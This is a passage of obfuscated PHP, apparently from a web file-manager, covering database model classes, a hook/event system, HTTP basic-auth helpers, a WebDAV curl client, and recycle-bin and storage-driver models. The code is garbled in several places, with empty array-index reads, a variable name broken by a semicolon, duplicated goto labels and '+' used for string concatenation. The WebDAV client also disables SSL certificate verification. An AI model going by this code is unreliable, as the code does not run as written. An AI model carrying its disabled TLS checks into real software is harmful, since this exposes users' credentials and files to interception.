$this->execute($E˛); goto F̞; aϖ҅: } } goto fӍ; bܠ: $BК = is_array($BК) ? $BК : array(); $E˛ = $C۸ᅟ[361]; $f = 0; goto F׳ν; e: $C۸ᅟ =& $_SERVER[]; $f = $this->tablePrefix . $this->tableName; $eԴ = self::SQL_WHERE_IN_CHUNK; goto bܠ; Bٍك: } public function saveAllEach($b) { $Aɱ =& $_SERVER[]; $bջЕ = $this->tablePrefix . $this->tableName; foreach ($b as $F؋) { if (!is_array($F؋) || count($F؋) != 4) { continue; } $B׊ӗ = $F؋[0] . $Aɱ[362] . $F؋[1] . $Aɱ[113]; $a햚 = $F؋[2] . $Aɱ[362] . $F؋[3] . $Aɱ[113]; $e숚 = "\x75\x70\144\141\164\145\40{$bջЕ}\40\x73\x65\164\x20{$a햚}\x20\167\150\x65\x72\x65\40{$B׊ӗ}\73"; $this->execute($e숚); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($CЈ = false, $b = false) { $this->_chunkEvent = $CЈ; $this->_chunkEventParam = $b; } private function chunkEventCheck($a) { if (!$this->_chunkEvent) { return; } $c = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $c[$_SERVER[][363]] = $a; Hook::trigger($this->_chunkEvent, $c); } public function addAll($eƍ, $fƍ = array(), $BϕϪ = false) { goto Aؒ; bᶃٓ: if (method_exists($this->db, $c[260])) { for ($c = 0; $c < count($eƍ); $c += $c܌) { $a = array_slice($eƍ, $c, $c܌); if (!is_array($a) || count($a) == 0) { break; } $d = $this->db->insertAll($a, $fƍ, $BϕϪ); $this->chunkEventCheck(count($a)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($eƍ as $eѪձ => $d) { $d = $this->db->insert($d, $fƍ, $BϕϪ); } $this->commit(); } if (!1 !== $d) { $d؉ó = $this->getLastInsID(); if ($d؉ó) { return $d؉ó; } } return $d; goto eν۹; Aؒ: $c =& $_SERVER[]; ignore_timeout(); $c܌ = self::SQL_WHERE_IN_CHUNK; goto B琩; B琩: if (empty($eƍ)) { $this->error = think_lang($c[259]); return !1; } $fƍ = $this->_parseOptions($fƍ); foreach ($eƍ as $eѪձ => $d) { $eƍ[$eѪձ] = $this->_facade($d); $this->_beforeInsert($eƍ[$eѪձ], $fƍ); } goto bᶃٓ; eν۹: } public function save($Aް = '', $C = array()) { goto Bߩߊ; Bٸ: $Aͳ = $this->findWhereField($D); if (!$Aͳ) { return parent::save($Aް, $C); } $Aİ = 0; goto eڄ; eڄ: $Eӎ = $D[$e֜ʅ[263]][$Aͳ][1]; $Eӎ = is_array($Eӎ) ? $Eӎ : array(); $AÆ󕕖 = count($Eӎ); goto bˋӮ; Bߩߊ: $e֜ʅ =& $_SERVER[]; $E淵 = self::SQL_WHERE_IN_CHUNK; $D = $this->optionsValue(); goto Bٸ; bˋӮ: for ($a = 0; $a < $AÆ󕕖; $a += $E淵) { $b펱 = array_slice($Eӎ, $a, $E淵); if (!is_array($b펱) || count($b펱) == 0) { break; } $D[$e֜ʅ[263]][$Aͳ][1] = $b펱; $this->optionsValue($D); $Aİ += parent::save($Aް, $C); $this->chunkEventCheck(count($b펱)); } $this->chunkEventSet(); return $Aİ; goto dɎ; dɎ: } public function add($f = '', $dբ = array(), $f = false) { if ($this->addTaskStatus && is_array($f)) { $this->addTaskData[] = $f; return; } return parent::add($f, $dբ, $f); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Bӵ = array()) { goto A; a۬: $Eʆ = $this->findWhereField($Cһʅ); if (!$Eʆ || isset($Cһʅ[$b[280]]) || isset($Cһʅ[$b[340]])) { return parent::select($Bӵ); } $b = $Cһʅ[$b[263]][$Eʆ][1]; goto f; f: $b = is_array($b) ? $b : array(); $aƹ = null; for ($C۽ = 0; $C۽ < count($b); $C۽ += $bΠ) { $aռ = array_slice($b, $C۽, $bΠ); if (!is_array($aռ) || count($aռ) == 0) { break; } $Cһʅ[$b[263]][$Eʆ][1] = $aռ; $this->optionsValue($Cһʅ); $cĭ = parent::select($Bӵ); if (!$cĭ) { continue; } if (is_null($aƹ)) { $aƹ = array(); } $aƹ = array_merge($aƹ, $cĭ); } goto E; E: return $aƹ; goto E; A: $b =& $_SERVER[]; $bΠ = self::SQL_WHERE_IN_CHUNK; $Cһʅ = $this->optionsValue(); goto a۬; E: } public function delete($A = array()) { goto BԨ; b푯: $C = $this->findWhereField($DẆ); if (!$C) { return parent::delete($A); } $Dމϥߞ = 0; goto bܹ; bܹ: $Aɽ = $DẆ[$E֢[263]][$C][1]; $Aɽ = is_array($Aɽ) ? $Aɽ : array(); for ($F剆 = 0; $F剆 < count($Aɽ); $F剆 += $b) { $E뮗 = array_slice($Aɽ, $F剆, $b); if (!is_array($E뮗) || count($E뮗) == 0) { break; } $DẆ[$E֢[263]][$C][1] = $E뮗; $this->optionsValue($DẆ); $Dމϥߞ += parent::delete($A); } goto a; BԨ: $E֢ =& $_SERVER[]; $b = self::SQL_WHERE_IN_CHUNK; $DẆ = $this->optionsValue(); goto b푯; a: return $Dމϥߞ; goto c; c: } private function findWhereField($AȌ) { $E㬷ܚ =& $_SERVER[]; $D = self::SQL_WHERE_IN_CHUNK; if (!is_array($AȌ) || !is_array($AȌ[$E㬷ܚ[263]])) { return !1; } foreach ($AȌ[$E㬷ܚ[263]] as $fĈޝ => $fχڦ) { if (is_array($fχڦ) && isset($fχڦ[0]) && is_string($fχڦ[0]) && strtolower($fχڦ[0]) == $E㬷ܚ[7] && is_array($fχڦ[1]) && count($fχڦ[1]) > $D) { ignore_timeout(); return $fĈޝ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\x65\x6d\117\160\164\x69\x6f\x6e"; public $field = array(); public function listData($eî = false, $Fʚ = "\155\x6f\144\x69\x66\171\x54\151\155\x65", $A = false) { $dꕬ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$dꕬ) { return $eî ? null : array(); } if (!$eî) { $dꕬ = array_filter(array_values($dꕬ)); return array_sort_by($dꕬ, $Fʚ, $A); } return $dꕬ[$_SERVER[][364] . $eî]; } public function insert($b𐄥ȵ) { goto C̮ؒ; a݈ͦ: $cӫ = $cӫ ? $cӫ : 0; $b𐄥ȵ[$Dؕӄ[367]] = ++$cӫ; $b𐄥ȵ[$Dؕӄ[187]] = time(); goto F; C̮ؒ: $Dؕӄ =& $_SERVER[]; $b𐄥ȵ = array_field_key($b𐄥ȵ, $this->field); $cӫ = Model($this->modelType)->get($Dؕӄ[365], $this->optionType . $Dؕӄ[366]); goto a݈ͦ; F: $b𐄥ȵ[$Dؕӄ[107]] = time(); Model($this->modelType)->set($Dؕӄ[365], $cӫ, $this->optionType . $Dؕӄ[366]); Model($this->modelType)->set($Dؕӄ[364] . $cӫ, $b𐄥ȵ, $this->optionType); goto b宣; b宣: return $cӫ; goto b־̞; b־̞: } public function update($e, $Bϼ) { goto e; B: if (!$fժ) { return !1; } $Bϼ = array_merge($fժ, $Bϼ); $Bϼ[$bɛ՛[107]] = time(); goto C; e: $bɛ՛ =& $_SERVER[]; $Bϼ = array_field_key($Bϼ, $this->field); $fժ = $this->listData($e); goto B; C: return Model($this->modelType)->set($bɛ՛[364] . $e, $Bϼ, $this->optionType); goto bǆ; bǆ: } public function remove($b) { return Model($this->modelType)->remove($_SERVER[][364] . $b, $this->optionType); } public function clear() { $bڔ =& $_SERVER[]; Model($this->modelType)->remove($bڔ[365], $this->optionType . $bڔ[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($fї㔯, $fè) { if (!$fè) { return !1; } $f = $this->listData(); $f = array_to_keyvalue($f, $fї㔯); return isset($f[$fè]) ? $f[$fè] : !1; } public function findByName($c繊) { return $this->findByKey($_SERVER[][28], $c繊); } protected function resetData($C) { $DΔ =& $_SERVER[]; $C = is_array($C) ? $C : array(); $eԃ = array(); for ($cڒĢ = 0; $cڒĢ < count($C); $cڒĢ++) { $eԃ[$DΔ[364] . $C[$cڒĢ][$DΔ[367]]] = $C[$cڒĢ]; } return Model($this->modelType)->set($eԃ, !1, $this->optionType); } private function getAutoName($aǷ) { $aȶ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$aȶ || !isset($aȶ[$aǷ])) { return $aǷ; } for ($eб = 1; $eб < count($aȶ); $eб++) { $B̼ = $aǷ . "\x28{$eб}\x29"; if (!isset($aȶ[$B̼])) { return $B̼; } } return $B̼; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($C = false, $Cޔܨ = '', $dˌղԌ = false) { goto B׎ʹ; F: $B쒃 = is_array($B쒃) ? $B쒃 : array(); if (is_array($Bт)) { $Bт = array_merge($B쒃, $Bт); return $C ? isset($Bт[$C]) ? $Bт[$C] : null : $Bт; } $B퉳 = $this->filterWhere(array($d[29] => $Cޔܨ)); goto d; dҕǐ: $this->cacheSet($Cޔܨ, $Bт); $Bт = array_merge($B쒃, $Bт); return $C ? $Bт[$C] : $Bт; goto F䙅; B׎ʹ: $d =& $_SERVER[]; $Bт = $this->cacheGet($Cޔܨ); $B쒃 = $this->optionDefault($Cޔܨ); goto F; d: $Bт = $this->where($B퉳)->select(); $Bт = array_to_keyvalue($Bт, $d[89], $d[359]); foreach ($Bт as $f̪ => $d) { if ($dˌղԌ || in_array($f̪, $this->jsonField)) { $Bт[$f̪] = json_decode($d, !0); } } goto dҕǐ; F䙅: } public function set($eލ, $fۜ߃ = false, $ḍ = '') { goto D; c: return $this->addAll($E׏ʍ, array(), !0); goto dՎ; A͙ײ: $a۸ˆ = is_array($eލ) ? $eލ : array($eލ => $fۜ߃); foreach ($a۸ˆ as $F => $d֏ئ) { if (is_array($d֏ئ)) { $d֏ئ = json_encode_force($d֏ئ); } $this->checkLength($d֏ئ, !1, $this->tableName . $E͉[4] . $eލ); $d֏ئ = self::textEncode($d֏ئ); $a۸ˆ = array($E͉[29] => $ḍ, $E͉[89] => $F, $E͉[359] => $d֏ئ); $E׏ʍ[] = $this->filterWhere($a۸ˆ); } if (!$E׏ʍ) { return !0; } goto c; D: $E͉ =& $_SERVER[]; $this->cacheRemove($ḍ); $E׏ʍ = array(); goto A͙ײ; dՎ: } protected function optionDefault($cሑ = '') { return !1; } public function setDeep($F˳, $Aس = false, $D҆ݬ = '') { $Aⴊ = explode($_SERVER[][91], $F˳); $e = $this->get(); array_set_value($e, $F˳, $Aس); $this->set($Aⴊ[0], $e[$Aⴊ[0]], $D҆ݬ); } public function remove($E, $e舄갸 = '') { $C콨 =& $_SERVER[]; $this->cacheRemove($e舄갸); $Dՙ = $this->filterWhere(array($C콨[89] => $E, $C콨[29] => $e舄갸)); if (is_null($E)) { unset($Dՙ[$C콨[89]]); } return $this->where($Dՙ)->delete(); } public function cacheSet($dӈ, $a꠭ = false) { return Cache::set($this->cacheKey($dӈ), $a꠭); } public function cacheGet($CĎ) { return Cache::get($this->cacheKey($CĎ)); } public function cacheRemove($fݤ) { return Cache::remove($this->cacheKey($fݤ)); } protected function filterWhere($E) { return $E; } protected function cacheKey($BƢ͂) { return $BƢ͂; } } goto E; FÏѴ: class Hook { private static $events = array(); public static function get($B = false) { if (!$B) { return self::$events; } else { return self::$events[$B]; } } public static function apply($a㚖, $Dƃ = array()) { $b嗼֍ = ActionApply($a㚖, $Dƃ); if (is_string($a㚖)) { Hook::trigger($a㚖); } return $b嗼֍; } public static function bind($E⭍ߖ, $Dޑ, $Eٴأ = false) { $Bͧ =& $_SERVER[]; if (!isset(self::$events[$E⭍ߖ])) { self::$events[$E⭍ߖ] = array(); } self::$events[$E⭍ߖ][] = array($Bͧ[1752] => $Dޑ, $Bͧ[1753] => $Eٴأ, $Bͧ[1754] => 0); } public static function once($C, $a) { self::bind($C, $a, !0); } public static function unbind($Cֶڟ, $E䦇 = false) { if (!$E䦇) { self::$events[$Cֶڟ] = array(); return; } $dά = self::$events[$Cֶڟ]; self::$events[$Cֶڟ] = array(); if (!is_array($dά)) { return; } for ($E؊ = 0; $E؊ < count($dά); $E؊++) { if ($dά[$E؊][$_SERVER[][1752]] == $E䦇) { continue; } self::$events[$Cֶڟ][] = $dά[$E؊]; } } public static function filter($cъ, $B) { goto E; f: $C烈 = $f[$cъ]; $A܌ = $B; if (!is_array($C烈) || count($C烈) == 0) { return $A܌; } goto Eѵߑ; E: $eއα =& $_SERVER[]; $f = self::$events; if (!isset($f[$cъ])) { return $B; } goto f; Eѵߑ: for ($aⷜ = 0; $aⷜ < count($C烈); $aⷜ++) { $b = $C烈[$aⷜ]; if ($b[$eއα[1753]] && $b[$eއα[1754]] > 1) { continue; } self::$events[$cъ][$aⷜ][$eއα[1754]] = $b[$eއα[1754]] + 1; $a = self::apply($b[$eއα[1752]], array($A܌)); if (gettype($a) == gettype($A܌)) { $A܌ = $a; } } return $A܌; goto e; e: } public static function trigger($bĶ) { goto bۼ; e୉: if (!isset($D[$bĶ])) { return $e; } $BÕ = $D[$bĶ]; if (!is_array($BÕ) || count($BÕ) == 0) { return $e; } goto eڏ; eڏ: $D = func_get_args(); array_shift($D); for ($bڗ = 0; $bڗ < count($BÕ); $bڗ++) { $D咛 = $BÕ[$bڗ]; if ($D咛[$Bɡ[1753]] && $D咛[$Bɡ[1754]] > 1) { continue; } if (defined($Bɡ[1755]) && GLOBAL_LOG_HOOK) { write_log($bĶ . $Bɡ[1756] . $D咛[$Bɡ[1752]], $Bɡ[1757]); } self::$events[$bĶ][$bڗ][$Bɡ[1754]] = $D咛[$Bɡ[1754]] + 1; $EƎ = self::apply($D咛[$Bɡ[1752]], $D); if (defined($Bɡ[1755]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $Bɡ[1757]); if ($D咛[$Bɡ[1754]] == 200) { $Eɮ = is_array($D咛[$Bɡ[1752]]) ? json_encode_force($D咛[$Bɡ[1752]]) : $D咛[$Bɡ[1752]]; write_log($Bɡ[1758] . $bĶ . $Bɡ[1759] . $Eɮ, $Bɡ[1760]); } } $e = is_null($EƎ) ? $e : $EƎ; } goto bߌĈ; bۼ: $Bɡ =& $_SERVER[]; $D = self::$events; $e = !1; goto e୉; bߌĈ: return $e; goto F; F: } } class HttpAuth { public static function get() { $A옟 =& $_SERVER[]; $d = $A옟[33]; $cͧ = $A옟[33]; if (isset($_SERVER[$A옟[1761]])) { $d = $_SERVER[$A옟[1761]]; $cͧ = $_SERVER[$A옟[1762]]; } elseif (isset($_SERVER[$A옟[1763]])) { $d奈 = $_SERVER[$A옟[1763]]; if (strpos(strtolower($d奈), $A옟[1764]) === 0) { $d = explode($A옟[4], base64_decode(substr($d奈, 6))); $d = isset($d[0]) ? $d[0] : $A옟[33]; $cͧ = isset($d[1]) ? $d[1] : 0; } } return array($A옟[537] => $d, $A옟[898] => $cͧ); } public static function error() { goto D; D: $bі =& $_SERVER[]; header($bі[1765]); header($bі[1766]); goto e; B: die; goto e; e: header($bі[1767]); header($bі[1768]); header($bі[1265]); goto B; e: } public static function make($D䯥˟, $dږ) { $Cɧᄈ =& $_SERVER[]; return $Cɧᄈ[1769] + base64_encode($D䯥˟ . $Cɧᄈ[4] . $dږ); } } class HttpDavClient { public function __construct($aɐޢ, $C썴ͮ, $dŔΌ) { $this->header = array(); $this->userName = $C썴ͮ; $this->userPassowrd = $dŔΌ; } protected function makePath($b) { return $b; } protected function setHeader($D攙, $c = false) { if ($c === !1) { $this->header[] = $D攙; } else { $this->header[] = $D攙 . $_SERVER[][881] . $c; } } public function move($E, $AŅ, $A̺ϙ = '') { $E =& $_SERVER[]; $this->setHeader($E[1770], $this->makePath($AŅ)); $this->setHeader($E[1771], $E[1772]); if ($A̺ϙ) { $this->setHeader($E[1773], $E[926] . $A̺ϙ . $E[929]); } return $this->send($E[1774], $E); } public function copy($b܆, $fÝ) { $d̙ =& $_SERVER[]; $this->setHeader($d̙[1770], $this->makePath($fÝ)); $this->setHeader($d̙[1771], $d̙[1772]); return $this->send($d̙[1775], $b܆); } public function mkcol($Bɚ) { $fꌍ =& $_SERVER[]; $this->setHeader($fꌍ[1771], $fꌍ[1772]); return $this->send($fꌍ[1776], $Bɚ); } public function delete($CԢ, $c႐ܪ = '') { $c􌧃 =& $_SERVER[]; if ($c႐ܪ) { $this->setHeader($c􌧃[1773], $c􌧃[926] . $c႐ܪ . $c􌧃[929]); } return $this->send($c􌧃[1253], $CԢ); } public function propfind($Cݗ) { $C؋ =& $_SERVER[]; $this->setHeader($C؋[1777], $C؋[83]); $this->setHeader($C؋[1778], $C؋[1779]); $Cڧ = $C؋[1780]; return $this->send($C؋[1781], $Cݗ, $Cڧ); } public function options($Cˆ) { return $this->send($_SERVER[][1782], $Cˆ); } public function get($e񚓴) { return $this->send($_SERVER[][216], $e񚓴); } public function put($dČ, $B͇, $Aި = '') { $F𔹳 =& $_SERVER[]; if ($Aި) { $this->setHeader($F𔹳[1773], $F𔹳[926] . $Aި . $F𔹳[929]); } return $this->send($F𔹳[214], $dČ, $B͇); } protected function send($Fʳ, $Fˣ, $bԍ = false, $FЌ؝ = false) { goto c힬; c힬: $c =& $_SERVER[]; $b = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($c[1783], $c[50]); goto Eԫ; bߺϦ: $this->header = array(); return $F; goto cٰ; d: $Bŉ = curl_init($Fˣ); curl_setopt($Bŉ, CURLOPT_CUSTOMREQUEST, $Fʳ); curl_setopt($Bŉ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto D; Eԫ: $this->setHeader($b); if ($bԍ) { $bԍ = $c[1784] . $bԍ; } if (!request_url_safe($Fˣ)) { return !1; } goto d; F͈ʬ: curl_setopt($Bŉ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Bŉ, CURLOPT_SSL_VERIFYHOST, !1); $F = curl_exec($Bŉ); goto bߺϦ; D: curl_setopt($Bŉ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Bŉ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Bŉ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto F͈ʬ; cٰ: } } goto e悸͎; f: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\x63\x65\137\x72\x65\143\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\x54\151\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\145\162\x74", "\146\x75\x6e\143\164\151\157\156")); public function listData($bߡ = false) { $Eǹ =& $_SERVER[]; $bߡ = $bߡ ? $bߡ : USER_ID; $E݈ = $this->where(array($Eǹ[1428] => $bߡ))->select(); return array_to_keyvalue($E݈, $Eǹ[33], $Eǹ[369]); } public function moveToRecycle($b똿) { goto e홯я; e홯я: $a뒖ʏ =& $_SERVER[]; $eܙ = Model($a뒖ʏ[1119]); $F = $eܙ->sourceInfo($b똿); goto E; aǧ: $this->recycleMove($b똿, 1); if ($F[$a뒖ʏ[370]] == $a뒖ʏ[83]) { $f;ȑ = array($a뒖ʏ[527] => array($a뒖ʏ[485], $F[$a뒖ʏ[461]] . $b똿 . $a뒖ʏ[486])); $eܙ->where($f;ȑ)->setField($a뒖ʏ[397], 1); } goto eקذ; E: if (!$F || $F[$a뒖ʏ[397]] == $a뒖ʏ[83]) { return; } $fܲ = array($a뒖ʏ[383] => $b똿, $a뒖ʏ[1428] => USER_ID, $a뒖ʏ[523] => $F[$a뒖ʏ[371]], $a뒖ʏ[524] => $F[$a뒖ʏ[458]], $a뒖ʏ[527] => $F[$a뒖ʏ[461]]); $this->add($fܲ); goto aǧ; eקذ: } public function clear() { $this->remove(!1); } public function remove($A賝 = false) { goto B諪; Aڄ: foreach ($eͰ as $Fձ) { $fؖҗ->targetSpaceUpdate($Fձ[$aϝ[371]], $Fձ[$aϝ[458]]); } goto E; B諪: $aϝ =& $_SERVER[]; $fؖҗ = Model($aϝ[1119]); $Aڿ = $this->listData(); goto Fމ; Fމ: $A賝 = $A賝 === !1 ? !1 : $A賝; $eͰ = array(); foreach ($Aڿ as $Bꅎ) { if ($A賝 != !1 && !in_array($Bꅎ, $A賝)) { continue; } $Cަ۷ = $fؖҗ->sourceInfo($Bꅎ); $fؖҗ->remove($Bꅎ, !1); $Aѱڑԍ = $Cަ۷[$aϝ[371]] . $aϝ[70] . $Cަ۷[$aϝ[458]]; $eͰ[$Aѱڑԍ] = array($aϝ[523] => $Cަ۷[$aϝ[371]], $aϝ[458] => $Cަ۷[$aϝ[458]]); $this->where(array($aϝ[369] => $Bꅎ))->delete(); } goto Aڄ; E: } public function restore($F = false) { goto CȮ; cɇ: foreach ($AӴ as $e鯈) { goto c٣; c٣: if ($F != !1 && !in_array($e鯈, $F)) { continue; } $Cȋ = $B->sourceInfo($e鯈); $AӲ = $B->sourceInfo($Cȋ[$e㙲[463]]); goto eߊ; f: $e[] = $Cȋ[$e㙲[463]]; if ($Cȋ[$e㙲[370]] == $e㙲[83]) { $e[] = $e鯈; } $B->lockMoveEnd($e鯈); goto e§; c⛾: if ($Cȋ[$e㙲[370]] == $e㙲[83]) { $D = array($e㙲[527] => array($e㙲[485], $Cȋ[$e㙲[461]] . $e鯈 . $e㙲[486])); $B->where($D)->setField($e㙲[397], 0); $this->restoreFolderChildren($e鯈, $AӴ); } $this->where(array($e㙲[369] => $e鯈))->delete(); $B->folderSizeReset($Cȋ[$e㙲[463]]); goto f; eߊ: if ($AӲ[$e㙲[397]] == $e㙲[83]) { continue; } $B->lockMoveStart($e鯈); $this->recycleMove($e鯈, 0); goto c⛾; e§: } $B->updateModifyTime($e); goto cለ; CȮ: $e㙲 =& $_SERVER[]; $B = Model($e㙲[1119]); $AӴ = $this->listData(); goto F; F: $F = $F == !1 ? !1 : $F; if (!$AӴ) { return !0; } $e = array(); goto cɇ; cለ: } private function restoreFolderChildren($Cג, $Fם) { goto b; E͍: foreach ($Fם as $cΕѳ) { if ($cΕѳ == $Cג) { continue; } if (!$eԌ->isParentOf($Cג, $cΕѳ)) { continue; } $B = $eԌ->sourceInfo($cΕѳ); if ($B[$aɏ[370]] == $aɏ[83]) { $f[] = array($aɏ[527] => array($aɏ[485], $B[$aɏ[461]] . $cΕѳ . $aɏ[486])); } else { $f[$aɏ[369]][1][] = $cΕѳ; } } if (!$f[$aɏ[369]][1]) { unset($f[$aɏ[369]]); } if (!$f) { return; } goto cڟ; b: $aɏ =& $_SERVER[]; $eԌ = Model($aɏ[1119]); $f = array($aɏ[369] => array($aɏ[7], array())); goto E͍; cڟ: $f[$aɏ[369]][1] = array_unique($f[$aɏ[369]][1]); $f[$aɏ[915]] = $aɏ[2193]; $eԌ->where($f)->setField($aɏ[397], 1); goto eك; eك: } private function recycleMove($aȃɹ, $c = 1) { $D⯡ͪ =& $_SERVER[]; $dޞ = Model($D⯡ͪ[1119]); $Bț = Model($D⯡ͪ[2385]); $D鍃 = array($D⯡ͪ[369] => $aȃɹ); if ($c) { $dޞ->where($D鍃)->setField($D⯡ͪ[397], 1); $Bț->eventRecycle($aȃɹ, $D⯡ͪ[2386]); } else { $B = $dޞ->where($D鍃)->find(); $f = $B[$D⯡ͪ[370]] == $D⯡ͪ[83]; $A엯 = $dޞ->fileNameAuto($B[$D⯡ͪ[463]], $B[$D⯡ͪ[28]], REPEAT_RENAME_FOLDER, $f); if ($A엯 != $B[$D⯡ͪ[28]]) { $dޞ->rename($aȃɹ, $A엯); } $dޞ->where($D鍃)->setField($D⯡ͪ[397], 0); $Bț->eventRecycle($aȃɹ, $D⯡ͪ[2387]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x73\164\157\x72\141\147\x65\x4c\x69\x73\164"; public $field = array("\156\x61\155\x65", "\163\151\x7a\x65\115\x61\x78", "\163\x79\x73\164\145\x6d", "\144\145\x66\141\x75\154\x74", "\144\162\x69\166\x65\x72", "\143\x6f\156\x66\151\x67"); public function listData($bʌ = false, $dᾆ = "\155\157\144\x69\x66\x79\124\x69\x6d\x65", $aȍё = false) { goto e٫; e٫: $e̓ư =& $_SERVER[]; $A٨ = parent::listData($bʌ, $dᾆ, $aȍё); if ($bʌ) { return $A٨; } goto D; D: foreach ($A٨ as $eě̶ => $bι) { unset($A٨[$eě̶][$e̓ư[6]]); $A٨[$eě̶][$e̓ư[2094]] = 0; } $CҊ = array_to_keyvalue($A٨, $e̓ư[33], $e̓ư[367]); $this->_listAppendSize($A٨, $CҊ); goto bև; bև: return $A٨; goto cק固; cק固: } public function _listAppendSize(&$c퍈ٗ, $fêǅ) { $D =& $_SERVER[]; if (!$fêǅ) { return; } $FˌѾ = $D[2388] . implode($D[47], $fêǅ) . $D[2389]; $c = Model($D[717])->query($FˌѾ); $c = array_to_keyvalue($c, $D[367], $D[77]); foreach ($c퍈ٗ as $C˼ݪ => $B) { $c퍈ٗ[$C˼ݪ][$D[2094]] = isset($c[$B[$D[367]]]) ? $c[$B[$D[367]]] : 0; } } public function getConfig($d竡) { $c = parent::listData($d竡); return json_decode($c[$_SERVER[][6]], !0); } public function update($e΄, $d؎) { goto fƢԭа; fƢԭа: $A =& $_SERVER[]; $E۶ؔ = $d؎[$A[28]]; $Cަ = array_to_keyvalue(parent::listData(), $A[28]); goto A; A: if (isset($Cަ[$E۶ؔ]) && $Cަ[$E۶ؔ][$A[367]] != $e΄) { return !1; } if (isset($d؎[$A[2390]]) && $d؎[$A[2390]] == $A[83]) { $this->checkConfig($d؎); } unset($d؎[$A[2390]]); goto c崳; c崳: $e = parent::update($e΄, $d؎); if ($e && $d؎[$A[34]]) { foreach ($Cަ as $cĬ) { if ($cĬ[$A[34]] && $cĬ[$A[367]] != $e΄) { parent::update($cĬ[$A[367]], array($A[34] => 0)); } } } return $e; goto C; C: } public function add($B¨) { goto bɪ; dֹ: $this->checkConfig($B¨); $E񣌽 = parent::insert($B¨); if ($E񣌽 && $B¨[$Fʳ[34]]) { foreach ($b as $Bܣͻ) { if ($Bܣͻ[$Fʳ[34]]) { parent::update($Bܣͻ[$Fʳ[367]], array($Fʳ[34] => 0)); } } } goto a탮; bɪ: $Fʳ =& $_SERVER[]; $b = array_to_keyvalue(parent::listData(), $Fʳ[28]); if (isset($b[$B¨[$Fʳ[28]]])) { return !1; } goto dֹ; a탮: return $E񣌽; goto dͩ; dͩ: } public function checkConfig(&$Fɲ) { goto Fڭ; Fڭ: $c =& $_SERVER[]; $FǄ = strtolower($Fɲ[$c[90]]); $Ã = json_decode($Fɲ[$c[6]], !0); goto bۍ; bۍ: foreach ($Ã as $cź => $Fٓ) { $Ã[$cź] = trim($Fٓ); } $Ã[$c[2391]] = rand_string(6); $a١ = $this->driverType($FǄ); goto F˜; aŕ: $Ã[$c[1026]] = $Fу; $Fɲ[$c[6]] = json_encode($Ã); $Fɲ[$c[90]] = $a١; goto Fɯ; Fɯ: return !0; goto d˯; C۔: $Fу = rtrim($Ã[$c[1026]], $c[8]) . $c[8]; $E = $C->getPath($Fу . $c[1989]); if (!$C->mkfile($E)) { show_json(LNG($c[2392]), !1); } goto aŕ; F˜: $fӈ = $c[71] . $a١; $C = new $fӈ($Ã); if (in_array($FǄ, $C->objectDriver)) { if (!$C->isBucketCors() && !$C->setBucketCors()) { $bՑ = LNG($c[2392]); $bՑ .= $c[2393] . LNG($c[2394]); show_json($bՑ, !1); } } goto C۔; d˯: } private function driverType($CԒ) { $C =& $_SERVER[]; $f휤 = array($C[102] => $C[2395], $C[58] => $C[2396], $C[64] => $C[2397]); if (isset($f휤[$CԒ])) { return $f휤[$CԒ]; } return strtoupper($CԒ); } public function driverListSystem() { $d =& $_SERVER[]; $A = parent::listData(); $f = array(); foreach ($A as $f) { unset($f[$d[187]], $f[$d[107]]); $f[$d[6]] = json_decode($f[$d[6]], !0); $f[] = $f; } return $f; } public function defaultDriver() { $CӞӏ =& $_SERVER[]; $F = parent::listData(); $d = array_filter_by_field($F, $CӞӏ[34], 1); $d = $d[0]; if ($d) { $d[$CӞӏ[6]] = json_decode($d[$CӞӏ[6]], !0); } return $d; } public function driverInfo($Cҳѧ) { $c󫙘 =& $_SERVER[]; $bօ = array_to_keyvalue(parent::listData(), $c󫙘[367]); if (!isset($bօ[$Cҳѧ])) { return !1; } $Dݗח = $bօ[$Cҳѧ]; $Dݗח[$c󫙘[6]] = json_decode($Dݗח[$c󫙘[6]], !0); return $Dݗח; } public function remove($a՛͍) { $this->removeShareItems($a՛͍); return parent::remove($a՛͍); } public function removeWithFile($b는) { goto F؝; Dѐޱ: $a->task[$F[697]] = (double) $c; $ań = KodIO::defaultDriver(); $eǂ = $ań[$F[367]]; goto f; a: $eܴ = Model($F[167])->where($B䛬)->field($F[2401])->select(); foreach ($eܴ as $a҆ݽ) { goto dż; dż: $f = $a҆ݽ[$F[75]]; $fϫ = $D . str_replace("\173\x69\x6f\x3a{$b는}\175\57", $F[33], $f); if (!IO::exist($f)) { $dĜ[] = $a҆ݽ[$F[419]]; $a->updateFileEnd($a҆ݽ[$F[28]], $a҆ݽ[$F[77]]); continue; } goto F; a藇: $e֯ = array($F[742] => $eǂ, $F[75] => $fϫ); Model($F[167])->where($B䛬)->save($e֯); goto a􊻺; F: if (IO::exist($fϫ)) { $a->updateFileEnd($a҆ݽ[$F[28]], $a҆ݽ[$F[77]]); continue; } if (!IO::move($f, get_path_father($fϫ))) { $e = !1; break; } $B䛬 = array($F[419] => $a҆ݽ[$F[419]]); goto a藇; a􊻺: } $this->removeByFileID($dĜ); goto e۞Щ; f: $D = 